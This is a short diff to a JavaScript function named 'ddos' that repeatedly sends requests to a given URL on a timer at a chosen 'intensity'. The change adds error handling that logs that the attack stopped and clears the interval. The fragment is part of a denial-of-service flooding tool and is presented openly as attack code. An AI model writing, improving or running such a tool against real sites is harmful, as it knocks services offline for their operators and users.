@@ -28,6 +28,8 @@ function ddos(url_, intensidad){
 		req.on('error', error => {
 		        console.log("An error ocurred: ");
 			console.error(error);
+			console.log("An error ocurred, and stoped the atack!")
+			return clearInterval(interval);
 	        })
 		req.end()
 	}, intensidad)
